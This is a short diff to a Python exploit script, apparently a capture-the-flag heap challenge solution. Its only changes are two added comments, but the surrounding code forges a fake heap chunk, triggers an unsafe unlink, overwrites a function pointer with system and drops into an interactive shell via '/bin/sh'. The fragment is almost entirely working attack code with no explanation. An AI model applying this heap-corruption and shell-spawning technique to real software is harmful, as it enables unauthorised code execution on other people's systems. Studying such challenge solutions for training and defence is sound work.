@@ -81,7 +81,8 @@ def pwn():
 	fake_chunk += p64(0x100)
 	fake_chunk += p64(0x110)
 	edit(0, fake_chunk)
-
+	
+	# unsafe unlink
 	free(3)
 
 	payload  = p64(0)
@@ -101,7 +102,8 @@ def pwn():
 	# one (puts) will be null terminated which will cause
 	# a crash since puts is called right after
 	edit(0, p64(system) + p64(puts))
-
+	
+	# system('/bin/sh')
 	free(1)
 
 	r.interactive()
